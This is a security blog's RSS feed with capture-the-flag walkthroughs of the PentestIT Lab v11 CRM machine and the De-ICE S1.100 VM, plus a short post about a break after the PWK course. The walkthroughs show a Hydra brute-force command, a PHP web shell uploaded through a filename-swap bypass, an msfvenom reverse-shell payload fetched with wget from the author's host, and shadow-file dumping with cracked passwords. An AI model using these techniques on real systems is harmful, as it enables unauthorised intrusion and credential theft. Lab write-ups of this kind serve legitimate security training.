<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>...and another security blog</title>
    <description>Adventures in the Infosec world.</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sun, 04 Mar 2018 18:11:28 -0800</pubDate>
    <lastBuildDate>Sun, 04 Mar 2018 18:11:28 -0800</lastBuildDate>
    <generator>Jekyll v3.6.2</generator>
    
      <item>
        <title>PentestIT Lab v11 - CRM</title>
        <description>&lt;p&gt;Opening the browser and going to 192.168.101.10 (TCP port 80), shows a welcome page for the lab. This seems to be a blog, and further look into the HTML code, I can see references to Wordpress links. Using WPscan, I learn this site is running the Kittycatfish plugin, which is vulnerable to a SQLi (&lt;a href=&quot;https://www.exploit-db.com/exploits/41919/&quot;&gt;WordPress Plugin KittyCatfish 2.2 - SQL Injection&lt;/a&gt;). My attempts to exploit this, either manually or through SQLmap, are unsuccessful. I suspect there’s some WAF in the middle as I’m getting forbidden responses when using SQLi attempts and also when bruteforcing the Wordpress admin login form. I move on to find something else as with an WAF in the middle, it will be difficult.&lt;/p&gt;

&lt;p&gt;From the HTML code, I see a link to http://192.168.101.10:88. Going to the link, I can see there’s a Vtiger 6.3.0 web application. Further research, tells me this version is vulnerable to an &lt;a href=&quot;https://www.exploit-db.com/exploits/38345/&quot;&gt;Authenticated Remote Code Execution&lt;/a&gt;. Through some web searching, I learn the default credentials are admin:admin, however, I get a invalid username or password. Time to brute force the admin’s password.&lt;/p&gt;

&lt;p&gt;I launch Burp and configure my browser to use it has a proxy. I then submit the login form with admin:admin credentials. From the Burp history, I get the POST data and the URL path I need to use. I then launch Hydra with the rockyou-60.txt wordlist from &lt;a href=&quot;https://github.com/danielmiessler/SecLists/tree/master/Passwords&quot;&gt;Seclists&lt;/a&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;hydra 192.168.101.10 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 88 http-post-form &lt;span class=&quot;s2&quot;&gt;&quot;/index.php?module=Users&amp;amp;action=Login:__vtrftk=sid%3A0e9ffbd5aee2325cb3254c8d41253bbd7c4bd27a%2C1518930935&amp;amp;username=^USER^&amp;amp;password=^PASS^:error=1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; rockyou-60.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 20&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In this login form, when the login fails, you get a 302 redirect to the login page again with the message “Invalid username or password”. However, Hydra doesn’t follow redirects, but I’ve noticed that on the 302 response, the Location header contains a error=1 parameter. That’s why I’m using it has the failed string.&lt;/p&gt;

&lt;p&gt;Going back to the password brute force, after several minutes, Hydra spits the known password: &lt;b&gt;blackstar&lt;/b&gt;. Now, with an authenticated session in the Vtiger CRM application, I can try to use the previous exploit found:&lt;/p&gt;

&lt;p&gt;I create a file 1.php with the content:&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This uses the PHP short tags, as the application is checking if the content contains &amp;lt;?php.&lt;/p&gt;

&lt;p&gt;I then go to Settings(Small gear on the top right) -&amp;gt; CRM Settings -&amp;gt; Templates -&amp;gt; Company Details -&amp;gt; Edit. I then click the Browse button to add my 1.php file, but first, I set Burp to intercept the form submit. However, there seems to be some Javascript to detect the file extension, which only permits images. I then change my 1.php to 1.jpg and submit the form again, this time with Burp intercept off. I then go to Burp’s history and send that POST request to Repeater. I then change the content of the filename from 1.jpg to 1.php and send the request again, maintaing the content type as jpeg:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;CompanyDetailsSave&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;-----------------------------&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2787963551806245971250936184&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disposition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.php&quot;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jpeg&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Accessing the URL path &lt;code&gt;/test/logo/1.php?cmd=whoami&lt;/code&gt;, will tell me that I’m running with www-data user. Sending &lt;code&gt;/test/logo/1.php?cmd=uname -a&lt;/code&gt;, I can see this is a Debian Linux system.&lt;/p&gt;

&lt;p&gt;Now it’s time to get a proper foothold into the system, so I can start doing proper enumeration. I generate a meterpreter with command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;MY_VPN_IP&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 1.elf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Launch a &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; to serve the meterpreter and from the browser execute &lt;code&gt;/test/logo/1.php?cmd=wget http://MY_IP:8000/1.elf -O /tmp/1.elf&lt;/code&gt;. However, I get a gateway timeout, looks like the server is not allowing egress connections to TCP port 8000. I then tried with TCP port 80 and still no connection. Tried ping (&lt;code&gt;test/logo/1.php?cmd=ping -c1 -w1 MY_IP&lt;/code&gt;), and I get no response, so in the end, it looks like there’s more restrictions on the egress traffic. Looking at the file /etc/iptables.save (&lt;code&gt;/test/logo/1.php?cmd=cat /etc/iptables.save&lt;/code&gt;), I can see it’s allowing egress traffic only to 172.16.0.11 and 172.16.0.254:&lt;/p&gt;

&lt;pre&gt;
# Generated by iptables-save v1.4.14 on Thu Jul  4 02:14:19 2013
*filter
:INPUT ACCEPT [194:23274]
:FORWARD ACCEPT [1268:354653]
:OUTPUT ACCEPT [155:40731]

## state,lo
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -i lo -j ACCEPT

## icmp
-A INPUT -p icmp --icmp-type 8 -j ACCEPT

## ssh
-A INPUT -p tcp --dport 22 -j ACCEPT

## www
-A INPUT -p tcp --dport 80 -j ACCEPT

### DROP OTHER
-A INPUT -j DROP

## OUT
-A OUTPUT -d 172.16.0.11 -j ACCEPT
-A OUTPUT -d 172.16.0.254 -j ACCEPT

-A OUTPUT -d 172.16.0.0/24 -j DROP
&lt;/pre&gt;

&lt;p&gt;At this point, my only option was to enumerate using the web shell. I’ve noticed that after a few minutes, my shell was gone, so I had to upload it again. Having the request ready in Burp Repeater was handy, because I had to upload the web shell many times.&lt;/p&gt;

&lt;p&gt;From the webshell I go to &lt;code&gt;/var/www/rce_token.txt&lt;/code&gt; and get the CRM token.&lt;/p&gt;

</description>
        <pubDate>Sun, 04 Mar 2018 00:46:00 -0800</pubDate>
        <link>http://localhost:4000/pentesting/2018/03/04/PentestIT-lab-v11-CRM.html</link>
        <guid isPermaLink="true">http://localhost:4000/pentesting/2018/03/04/PentestIT-lab-v11-CRM.html</guid>
        
        
        <category>Pentesting</category>
        
      </item>
    
      <item>
        <title>De-ICE S1.100 walkthrough</title>
        <description>&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;pre&gt;
&lt;code&gt;
root@kali:~# nmap -p21,22,25,80,110,143,443 -sV 192.168.1.100
Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-11-11 01:52 EST
Nmap scan report for 192.168.1.100
Host is up (0.00035s latency).
PORT    STATE  SERVICE VERSION
21/tcp  open   ftp     vsftpd (broken: could not bind listening IPv4 socket)
22/tcp  open   ssh     OpenSSH 4.3 (protocol 1.99)
25/tcp  open   smtp    Sendmail 8.13.7/8.13.7
80/tcp  open   http    Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
110/tcp open   pop3    Openwall popa3d
143/tcp open   imap    UW imapd 2004.357
443/tcp closed https
MAC Address: 08:00:27:54:93:FD (Cadmus Computer Systems)
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;FTP connection to port TCP 21 gives me the following error:&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;
# ftp 192.168.1.100
Connected to 192.168.1.100.
500 OOPS: could not bind listening IPv4 socket
&lt;/code&gt;
&lt;/pre&gt;

&lt;h3 id=&quot;web-server-enumeration&quot;&gt;Web Server Enumeration&lt;/h3&gt;

&lt;p&gt;There’s a Webserver listening on TCP 80. This webserver is hosting a page on /index2.php containing employee’s email addresses and names:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen1.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;
Head of HR: Marie Mary - marym@herot.net (On Emergency Leave)
Employee Pay: Pat Patrick - patrickp@herot.net
Travel Comp: Terry Thompson - thompsont@herot.net
Benefits: Ben Benedict - benedictb@herot.net

Director of Engineering: Erin Gennieg - genniege@herot.net
Project Manager: Paul Michael - michaelp@herot.net
Engineer Lead: Ester Long - longe@herot.net

Sr. System Admin: Adam Adams - adamsa@herot.net
System Admin (Intern): Bob Banter - banterb@herot.net
System Admin: Chad Coffee - coffeec@herot.net
&lt;/pre&gt;

&lt;p&gt;Using &lt;b&gt;dirb&lt;/b&gt;, I was able to enumerate 4 more webpages:&lt;/p&gt;

&lt;pre&gt;
+ http://192.168.1.100/~ftp (CODE:403|SIZE:412)
+ http://192.168.1.100/cgi-bin/ (CODE:403|SIZE:297)
+ http://192.168.1.100/index.php (CODE:200|SIZE:1983)
+ http://192.168.1.100/info.php (CODE:200|SIZE:37922)
&lt;/pre&gt;

&lt;p&gt;/~ftp and /cgi-bin/ are not accessible. &lt;b&gt;info.php&lt;/b&gt; contains the PHP configuration of the website:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen2.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some interesting information from the info.php:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The kernel is 2.6.16 32bit&lt;/li&gt;
  &lt;li&gt;allow_url_fopen is enable, which can be used is there’s a RFI vulnerability present&lt;/li&gt;
  &lt;li&gt;Apache is running under nobody’s account, which means I won’t get root access in case of a compromise throught the web server application&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To generate a possible wordlist to use against password attacks, I use the tool cewl to grab information from the webpage /index2.php and generate a list of possible passwords:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen3.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The SysAdmins are the most probably users of the core system, so I generate a simple list with possible usernames for the OS:&lt;/p&gt;

&lt;p&gt;Some companies use the email username section as usernames, but other permutations may happen as well. What I did was also use first letter of first name + surname:&lt;/p&gt;

&lt;pre&gt;
aadams
bbanter
ccoffee
&lt;/pre&gt;

&lt;p&gt;and the normal email usernames:&lt;/p&gt;

&lt;pre&gt;
adamsa
banterb
coffeec
&lt;/pre&gt;

&lt;p&gt;I put everything into a file admin_users.txt.&lt;/p&gt;

&lt;h3 id=&quot;smtp-enumeration&quot;&gt;SMTP Enumeration&lt;/h3&gt;

&lt;p&gt;Now I can use the SMTP server to enumerate the admin_users.txt list:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen4.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I get 3 usernames found: &lt;b&gt;aadams&lt;/b&gt;, &lt;b&gt;bbanter&lt;/b&gt;, &lt;b&gt;ccofee&lt;/b&gt;. Notice also that I had to use a &lt;b&gt;from email: my@slax.example.net&lt;/b&gt; which is the domain the SMTP server accepts.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;h3 id=&quot;penetrating-the-system&quot;&gt;Penetrating the System&lt;/h3&gt;

&lt;p&gt;Per the previous information gathering phase, I was able to learn that there are at least 3 known users in the system: aadams, bbanter, ccofee.&lt;/p&gt;

&lt;p&gt;Per the information available in the website, I know that Bob Banter (bbanter) is an intern and probably lacks some good security pratices. This makes him a target.&lt;/p&gt;

&lt;p&gt;I was able to login into the system through SSH, using the username bbanter and password bbanter:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen5.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As expected, Bob Banter is not following the good security practices and used his username as the password.&lt;/p&gt;

&lt;h3 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h3&gt;

&lt;p&gt;From the /etc/passwd file I can see the account aadams is part of the wheel group, which means it can sudo with root privileges:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen6.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The account aadams becomes a target as it can provide me high privileges on the machine.&lt;/p&gt;

&lt;p&gt;I run a password brute force attack against aadams account with Hydra and I get the nostradamus password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen7.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’ve used the pop3 service as it’s much faster than trying the brute force against SSH.&lt;/p&gt;

&lt;p&gt;I can now change to account aadams and use sudo to get the shadow file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen8.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen9.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;root hash password: $1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0&lt;/p&gt;

&lt;pre&gt;
aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
&lt;/pre&gt;

&lt;p&gt;Just using the account aadams and sudo I can see there’s a interesting file in /home/ftp/incoming:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen10.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The file seems to be encrypted.&lt;/p&gt;

&lt;p&gt;I proceed and try to crack the password hashes in the shadow with john the ripper:&lt;/p&gt;

&lt;pre&gt;
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
&lt;/pre&gt;

&lt;p&gt;I was able to crack the hash:&lt;/p&gt;

&lt;pre&gt;
root@kali:~# john --show pass.txt 
root:tarot
&lt;/pre&gt;

&lt;p&gt;I also found out the ccoffee’s password:&lt;/p&gt;
&lt;pre&gt;
ccoffee:hierophant
&lt;/pre&gt;

&lt;p&gt;At this moment I have the password for root and the 3 admins:&lt;/p&gt;

&lt;pre&gt;
root:tarot
aadams:nostradamus
bbanter:bbanter
ccoffee:hierophant
&lt;/pre&gt;

&lt;h3 id=&quot;capturing-the-flag&quot;&gt;Capturing the Flag&lt;/h3&gt;

&lt;p&gt;Analysing the file salary_dec2003.csv.enc with strings, I see the Salted__ word. Some googling tells me this is a openssl encrypted file.&lt;/p&gt;

&lt;p&gt;From the /etc/passwd file I got a hint that the root’s password might be used in the FTP encryption (and consequently the .csv file). I scp the file to my Kali machine and use openssl to decrypt the file:&lt;/p&gt;

&lt;pre&gt;
root@kali:~# openssl enc -aes-128-cbc -d -in salary_dec2003.csv.enc -out salary_dec2003.csv -k tarot
&lt;/pre&gt;

&lt;p&gt;I didn’t know the cipher used for the encryption, so I tried the first one and I was lucky. Now I open the .csv file in Excel:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/screen11.png&quot; alt=&quot;Alt text&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 16 Nov 2015 12:55:41 -0800</pubDate>
        <link>http://localhost:4000/pentesting/2015/11/16/deice-s1100.html</link>
        <guid isPermaLink="true">http://localhost:4000/pentesting/2015/11/16/deice-s1100.html</guid>
        
        
        <category>Pentesting</category>
        
      </item>
    
      <item>
        <title>My break after the Offensive-Security PWK labs</title>
        <description>&lt;p&gt;After finishing the Offensive Security PWK course labs, I decided to take a break and wait for a while before taking the certification exam. This was because, first, I needed some rest, and second, I wanted to have more time to prepare the labs report and generate a good template report for the exam.&lt;/p&gt;

&lt;p&gt;I learned so much during the PWK labs, that during this break, I decided to put my hands on some of the vulnerable machine challenges out there. I’m using the website &lt;a href=&quot;http://www.vulnhub.com&quot;&gt;Vulnerable by Design&lt;/a&gt; and after reading some stuff on the web, the De-ICE series, Kioptrix, Holynix and Tr0ll seem to be good targets. These are all “boot2root” vulnerable VMs.&lt;/p&gt;

&lt;p&gt;I thought to myself that these VMs should be pretty simple, after the experience I had with the PWK labs. It happens that I was wrong and I actually learned new things that could be helpful on the OSCP exam. I’ll be posting my walkthroughs of these challenges.&lt;/p&gt;

</description>
        <pubDate>Mon, 16 Nov 2015 12:43:41 -0800</pubDate>
        <link>http://localhost:4000/pentesting/2015/11/16/oscp-break.html</link>
        <guid isPermaLink="true">http://localhost:4000/pentesting/2015/11/16/oscp-break.html</guid>
        
        
        <category>Pentesting</category>
        
      </item>
    
  </channel>
</rss>
